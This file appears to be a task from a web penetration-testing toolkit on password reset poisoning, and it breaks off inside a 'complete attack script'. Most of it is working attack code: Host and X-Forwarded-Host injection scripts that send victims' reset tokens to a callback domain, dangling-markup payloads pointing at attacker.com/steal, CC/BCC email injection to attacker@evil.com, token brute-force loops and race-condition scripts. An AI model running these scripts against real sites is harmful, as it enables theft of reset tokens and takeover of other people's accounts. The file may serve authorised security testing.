================================================================================
TASK 66 Â· PASSWORD RESET POISONING
================================================================================
Covers testing_toolkit.txt Phase 7 Step 26
Complete password reset exploitation methodology.

OBJECTIVE:
- Exploit Host header injection to steal reset tokens
- Test X-Forwarded-Host and related header poisoning
- Identify token leakage via Referer headers
- Test for predictable/weak reset tokens
- Exploit token fixation and race conditions

================================================================================
INPUTS
================================================================================
outputs/har/common_data.txt               â† Password reset endpoints from HAR
outputs/live_base_urls.txt                â† Target hosts
outputs/url_corpus_all_in_scope.txt       â† URL corpus (grep for reset/forgot paths)

================================================================================
OUTPUTS
================================================================================
outputs/password_reset/
â”œâ”€â”€ reset_endpoints.txt            â† Identified reset endpoints
â”œâ”€â”€ host_poisoning.txt             â† Host header injection results
â”œâ”€â”€ token_analysis.txt             â† Token predictability analysis
â”œâ”€â”€ token_leakage.txt              â† Referer/URL leakage findings
â”œâ”€â”€ race_condition.txt             â† Race condition test results
â””â”€â”€ scan_log.txt                   â† Full execution log

================================================================================
ğŸ§  PASSWORD RESET FUNDAMENTALS ğŸ§ 
================================================================================

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
Password Reset Flow (Typical)
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
1. User clicks "Forgot Password"
2. User enters email/username
3. Server generates reset token
4. Server sends email: https://target.com/reset?token=abc123
5. User clicks link, enters new password
6. Server validates token, resets password

ATTACK OPPORTUNITIES:
- Step 4: Poison the URL domain (Host header injection)
- Step 4: Leak token via Referer header
- Step 3: Predict token value
- Step 5: Race condition on token validation
- Step 6: Token reuse/no expiration

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
Why Host Header Matters
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
When generating reset link, app often uses:
```
reset_url = "https://" + request.headers["Host"] + "/reset?token=" + token
```

If attacker controls Host header:
```
Host: evil.com
â†’ Victim receives: https://evil.com/reset?token=abc123
â†’ Victim clicks â†’ Token sent to attacker!
```

================================================================================
PHASE 1: RESET ENDPOINT DISCOVERY
================================================================================

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
1.1 Find Reset Endpoints
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Common reset endpoint patterns
/forgot-password
/forgot
/reset-password
/reset
/password/reset
/password/forgot
/recover
/recovery
/api/auth/forgot
/api/password/reset
/api/users/forgot-password
/auth/forgot-password

# Search in HAR/corpus
grep -rPi 'forgot|reset|recover|password' outputs/har_*

# Enumerate endpoints
for endpoint in forgot-password forgot reset-password reset recover recovery; do
    curl -s -o /dev/null -w "%{http_code} - $endpoint\n" \
        "https://target.com/${endpoint}"
done

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
1.2 Identify Reset Form Parameters
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Get reset form
curl -s "https://target.com/forgot-password" | grep -oP 'name="[^"]+"'

# Common parameters
email
username
user
login
identity
account

# Test reset request
curl -s -X POST "https://target.com/forgot-password" \
    -d "email=test@target.com" \
    -D response_headers.txt

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
1.3 Identify Token Format
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Request reset for test account, examine token in email/URL

# Common token formats:
# UUID: 550e8400-e29b-41d4-a716-446655440000
# Hex: a1b2c3d4e5f6a7b8c9d0e1f2
# Base64: SGVsbG9Xb3JsZA==
# JWT: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
# Timestamp-based: 1704067200_abc123
# Sequential: 10001, 10002, 10003

================================================================================
PHASE 2: HOST HEADER POISONING
================================================================================

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
2.1 Basic Host Header Injection
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Start Interactsh to receive callbacks
interactsh-client -v 2>&1 | tee interactsh.log &
INTERACT_DOMAIN="YOUR_INTERACT_DOMAIN.oast.fun"

# Test 1: Direct Host replacement
curl -s -X POST "https://target.com/forgot-password" \
    -H "Host: ${INTERACT_DOMAIN}" \
    -d "email=victim@target.com"

# Test 2: Host with port
curl -s -X POST "https://target.com/forgot-password" \
    -H "Host: ${INTERACT_DOMAIN}:443" \
    -d "email=victim@target.com"

# Test 3: Absolute URL in request line (bypass some filters)
curl -s -X POST "https://target.com/forgot-password" \
    --request-target "http://${INTERACT_DOMAIN}/forgot-password" \
    -d "email=victim@target.com"

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
2.2 X-Forwarded-Host Injection
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Many apps check X-Forwarded-Host for reverse proxy scenarios

curl -s -X POST "https://target.com/forgot-password" \
    -H "X-Forwarded-Host: ${INTERACT_DOMAIN}" \
    -d "email=victim@target.com"

# With original host preserved
curl -s -X POST "https://target.com/forgot-password" \
    -H "Host: target.com" \
    -H "X-Forwarded-Host: ${INTERACT_DOMAIN}" \
    -d "email=victim@target.com"

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
2.3 Other Host-Like Headers
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
#!/bin/bash
# host_header_poisoning.sh

TARGET_RESET="$1"
VICTIM_EMAIL="$2"
INTERACT_DOMAIN="$3"

HOST_HEADERS=(
    "X-Forwarded-Host"
    "X-Host"
    "X-Forwarded-Server"
    "X-HTTP-Host-Override"
    "X-Original-URL"
    "X-Rewrite-URL"
    "X-Custom-IP-Authorization"
    "Forwarded"
)

echo "[*] Testing host header poisoning on $TARGET_RESET"
echo "[*] Victim email: $VICTIM_EMAIL"
echo "[*] Callback domain: $INTERACT_DOMAIN"

# Test each header
for header in "${HOST_HEADERS[@]}"; do
    echo "[*] Testing: $header"
    
    if [ "$header" = "Forwarded" ]; then
        # RFC 7239 format
        curl -s -X POST "$TARGET_RESET" \
            -H "Forwarded: host=${INTERACT_DOMAIN}" \
            -d "email=$VICTIM_EMAIL" > /dev/null
    else
        curl -s -X POST "$TARGET_RESET" \
            -H "$header: ${INTERACT_DOMAIN}" \
            -d "email=$VICTIM_EMAIL" > /dev/null
    fi
    
    sleep 1
done

# Test combinations
echo "[*] Testing combinations..."
curl -s -X POST "$TARGET_RESET" \
    -H "X-Forwarded-Host: ${INTERACT_DOMAIN}" \
    -H "X-Host: ${INTERACT_DOMAIN}" \
    -d "email=$VICTIM_EMAIL" > /dev/null

echo "[*] Check Interactsh for callbacks with reset tokens"

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
2.4 Host Header Bypass Techniques
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# If basic injection blocked, try bypass techniques

INTERACT_DOMAIN="attacker.oast.fun"
REAL_HOST="target.com"

# Technique 1: Duplicate Host header
curl -s -X POST "https://target.com/forgot-password" \
    -H "Host: ${REAL_HOST}" \
    -H "Host: ${INTERACT_DOMAIN}" \
    -d "email=victim@target.com"

# Technique 2: Host with tab/space
curl -s -X POST "https://target.com/forgot-password" \
    -H $'Host: target.com\t' \
    -H "X-Forwarded-Host: ${INTERACT_DOMAIN}" \
    -d "email=victim@target.com"

# Technique 3: Port injection
curl -s -X POST "https://target.com/forgot-password" \
    -H "Host: target.com:@${INTERACT_DOMAIN}" \
    -d "email=victim@target.com"

# Technique 4: URL encoding in host
curl -s -X POST "https://target.com/forgot-password" \
    -H "Host: target.com%0d%0aX-Injected: ${INTERACT_DOMAIN}" \
    -d "email=victim@target.com"

# Technique 5: Subdomain injection
curl -s -X POST "https://target.com/forgot-password" \
    -H "Host: ${INTERACT_DOMAIN}.target.com" \
    -d "email=victim@target.com"

# Technique 6: Add port to real host
curl -s -X POST "https://target.com/forgot-password" \
    -H "Host: target.com:443" \
    -H "X-Forwarded-Host: ${INTERACT_DOMAIN}:443" \
    -d "email=victim@target.com"

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
2.5 Dangling Markup in Reset Email
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# If direct host poisoning fails, try dangling markup in email body

# Inject into email parameter if reflected in email body
curl -s -X POST "https://target.com/forgot-password" \
    -d "email=victim@target.com<img src='https://attacker.com/steal?"

# Inject via name field if exists
curl -s -X POST "https://target.com/forgot-password" \
    -d "email=victim@target.com&name=<a href='https://attacker.com/steal?"

================================================================================
PHASE 3: TOKEN LEAKAGE
================================================================================

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
3.1 Referer Header Leakage
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# If reset page has external resources, token leaks via Referer

# Check reset page for external resources
curl -s "https://target.com/reset?token=test123" | \
    grep -oP 'src="https?://[^"]+"|href="https?://[^"]+"' | \
    grep -v target.com

# External JS, CSS, images, fonts leak Referer header
# Victim clicks reset link â†’ page loads external resource â†’ Referer leaked

# Check Referrer-Policy header
curl -s -D - "https://target.com/reset?token=test123" | \
    grep -i "referrer-policy"

# If no Referrer-Policy or "unsafe-url" â†’ Leakage possible

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
3.2 Token in URL vs POST Body
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Tokens in URL are more vulnerable to leakage

# Check if token is in URL
# https://target.com/reset?token=abc123 â†’ Vulnerable to Referer, logs, history

# Check if token is in POST body (more secure)
# Token submitted via form, not visible in URL

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
3.3 Token in Response/Error Messages
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Check if token is leaked in responses

curl -s -X POST "https://target.com/forgot-password" \
    -d "email=test@test.com" | grep -iPo 'token[=:][^&"\s]+'

# Check error messages
curl -s "https://target.com/reset?token=invalid" | \
    grep -iPo 'token|reset|invalid'

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
3.4 Token in API Response
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Some APIs return token in response (for mobile apps)

curl -s -X POST "https://target.com/api/forgot-password" \
    -H "Content-Type: application/json" \
    -d '{"email":"test@test.com"}' | jq .

# Look for: token, reset_token, reset_url, link

================================================================================
PHASE 4: TOKEN PREDICTABILITY
================================================================================

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
4.1 Collect Multiple Tokens
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Generate multiple reset tokens and analyze patterns

#!/bin/bash
# collect_reset_tokens.sh

TARGET="$1"
EMAIL="$2"
COUNT=${3:-10}

echo "[*] Collecting $COUNT reset tokens"

for i in $(seq 1 $COUNT); do
    curl -s -X POST "$TARGET" -d "email=$EMAIL" > /dev/null
    echo "[*] Request $i sent"
    sleep 2
done

echo "[*] Check email inbox for tokens"
echo "[*] Analyze for patterns: sequential, timestamp, weak random"

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
4.2 Token Pattern Analysis
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Analyze collected tokens for patterns

# Sequential tokens
# Token 1: abc123
# Token 2: abc124
# Token 3: abc125
# â†’ Predictable, can enumerate

# Timestamp-based
# Token: 1704067200_abc123
# â†’ Contains Unix timestamp, narrow brute-force window

# User-data in token
# Token: base64(user_id + timestamp)
# â†’ Decode and analyze structure

# Weak randomness
# Compare tokens for common prefixes/suffixes
# Check entropy using:
echo -n "token_value" | wc -c  # Length
echo -n "token_value" | xxd -p | wc -c  # Unique bytes

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
4.3 JWT Reset Tokens
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# If reset token is JWT, analyze structure

TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# Decode JWT
echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq .

# Check for:
# - User identifier in payload
# - Timestamp/expiration
# - Weak algorithm (none, HS256 with weak secret)

# Test JWT attacks (reference Task 61)
# - Algorithm none
# - Secret brute-force

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
4.4 Token Brute-Force
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# If token is short or predictable

#!/bin/bash
# brute_reset_token.sh

TARGET="$1"  # https://target.com/reset
EMAIL="$2"

# Short numeric tokens
for token in $(seq 100000 999999); do
    response=$(curl -s "${TARGET}?token=${token}&email=${EMAIL}")
    if ! echo "$response" | grep -qi "invalid\|expired\|error"; then
        echo "[!] Valid token found: $token"
        break
    fi
done

# Sequential tokens (if pattern found)
KNOWN_TOKEN="abc123"
for i in {0..1000}; do
    test_token="${KNOWN_TOKEN:0:-3}$((${KNOWN_TOKEN: -3} + i))"
    # Test token...
done

================================================================================
PHASE 5: TOKEN LIFECYCLE ATTACKS
================================================================================

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
5.1 Token Expiration Testing
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Test how long tokens remain valid

# Generate token
curl -s -X POST "https://target.com/forgot-password" \
    -d "email=test@test.com"

# Get token from email, then wait and test
# Good: 15-60 minutes expiration
# Bad: Hours, days, or no expiration

# Test token after various intervals
# 1 hour, 24 hours, 1 week

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
5.2 Token Reuse After Password Change
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Critical: Can token be reused after password is reset?

# Step 1: Generate reset token
# Step 2: Use token to reset password
# Step 3: Try using same token again

curl -s "https://target.com/reset?token=VALID_TOKEN" \
    -X POST -d "password=newpass123&confirm=newpass123"

# Now try again with same token
curl -s "https://target.com/reset?token=VALID_TOKEN" \
    -X POST -d "password=anotherpass&confirm=anotherpass"

# If works â†’ Token not invalidated after use!

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
5.3 Multiple Valid Tokens
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Check if generating new token invalidates old one

# Generate token A
curl -s -X POST "https://target.com/forgot-password" -d "email=test@test.com"

# Generate token B
curl -s -X POST "https://target.com/forgot-password" -d "email=test@test.com"

# Test if token A still works after B was generated
curl -s "https://target.com/reset?token=TOKEN_A"

# If A still works â†’ Multiple valid tokens (weaker security)

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
5.4 Token Fixation
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Can attacker set/fix the reset token?

# Test if token can be supplied in request
curl -s -X POST "https://target.com/forgot-password" \
    -d "email=victim@target.com&token=attacker_known_token"

# Some apps accept user-supplied token!

================================================================================
PHASE 6: RACE CONDITIONS
================================================================================

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
6.1 Concurrent Reset Requests
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Send multiple reset requests simultaneously

#!/bin/bash
# race_password_reset.sh

TARGET="$1"
EMAIL="$2"

echo "[*] Sending concurrent reset requests"

for i in {1..20}; do
    curl -s -X POST "$TARGET" -d "email=$EMAIL" &
done
wait

echo "[*] Check email - multiple tokens may be generated"
echo "[*] Or same token sent multiple times (information disclosure)"

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
6.2 Race on Token Validation
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Try to use token multiple times simultaneously

#!/bin/bash
# race_token_use.sh

TARGET="$1"  # https://target.com/reset
TOKEN="$2"

echo "[*] Racing token validation"

for i in {1..10}; do
    curl -s -X POST "${TARGET}?token=${TOKEN}" \
        -d "password=newpass${i}&confirm=newpass${i}" &
done
wait

echo "[*] Check if multiple password resets succeeded"

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
6.3 Race Between Token Generation and Use
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Generate token and try to use predicted value simultaneously

# If tokens are timestamp-based or sequential:
# 1. Predict next token value
# 2. Send reset request
# 3. Simultaneously try predicted token

================================================================================
PHASE 7: ADDITIONAL ATTACK VECTORS
================================================================================

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
7.1 Email Parameter Pollution
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Send reset to multiple emails

# Array syntax
curl -s -X POST "https://target.com/forgot-password" \
    -d "email[]=victim@target.com&email[]=attacker@evil.com"

curl -s -X POST "https://target.com/forgot-password" \
    -d "email=victim@target.com&email=attacker@evil.com"

# Comma-separated
curl -s -X POST "https://target.com/forgot-password" \
    -d "email=victim@target.com,attacker@evil.com"

# CC/BCC injection
curl -s -X POST "https://target.com/forgot-password" \
    -d "email=victim@target.com%0aCc:attacker@evil.com"

curl -s -X POST "https://target.com/forgot-password" \
    -d "email=victim@target.com%0aBcc:attacker@evil.com"

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
7.2 Unicode/Encoding Attacks
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Unicode normalization attacks on email

# Victim email: admin@target.com
# Try: admÄ±n@target.com (Turkish dotless i)

# Case manipulation (some systems normalize)
curl -s -X POST "https://target.com/forgot-password" \
    -d "email=VICTIM@TARGET.COM"

# Subdomain tricks
curl -s -X POST "https://target.com/forgot-password" \
    -d "email=victim@target.com@attacker.com"

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
7.3 Account Enumeration via Reset
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Different responses for valid vs invalid emails

# Valid email
curl -s -X POST "https://target.com/forgot-password" \
    -d "email=exists@target.com"

# Invalid email
curl -s -X POST "https://target.com/forgot-password" \
    -d "email=notexists@target.com"

# Compare:
# - Response body
# - Status code
# - Response time
# - Headers

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
7.4 Password Reset via User ID
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# If reset uses user ID instead of email

curl -s -X POST "https://target.com/api/forgot-password" \
    -H "Content-Type: application/json" \
    -d '{"user_id": 1}'

curl -s -X POST "https://target.com/api/forgot-password" \
    -H "Content-Type: application/json" \
    -d '{"user_id": "victim_username"}'

# If no auth required â†’ IDOR on password reset!

================================================================================
PHASE 8: COMPLETE ATTACK SCRIPT
================================================================================

#!/bin/bash
# complete_password_reset_attack.sh

TARGET="$1"
RESET_URL="${TARGET}/forgot-password"
VICTIM_EMAIL="$2"
INTERACT_DOMAIN="$3"

OUTPUT_DIR="outputs/password_reset"
mkdir -p "$OUTPUT_DIR"

echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
echo " Password Reset Attack Suite - $TARGET"
echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"

# TEST 1: Host Header Poisoning
echo ""
echo "[TEST 1] Host Header Poisoning"
echo "â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€"

HOST_HEADERS=(
    "Host:${INTERACT_DOMAIN}"
    "X-Forwarded-Host:${INTERACT_DOMAIN}"
    "X-Host:${INTERACT_DOMAIN}"
    "X-Forwarded-Server:${INTERACT_DOMAIN}"
    "Forwarded:host=${INTERACT_DOMAIN}"
)

for header in "${HOST_HEADERS[@]}"; do
    header_name="${header%%:*}"
    header_value="${header#*:}"
    echo "[*] Testing: $header_name"
    
    curl -s -X POST "$RESET_URL" \
        -H "${header_name}: ${header_value}" \
        -d "email=$VICTIM_EMAIL" > /dev/null
    
    sleep 1
done

echo "[*] Check Interactsh: $INTERACT_DOMAIN"

# TEST 2: Email Parameter Pollution
echo ""
echo "[TEST 2] Email Parameter Pollution"
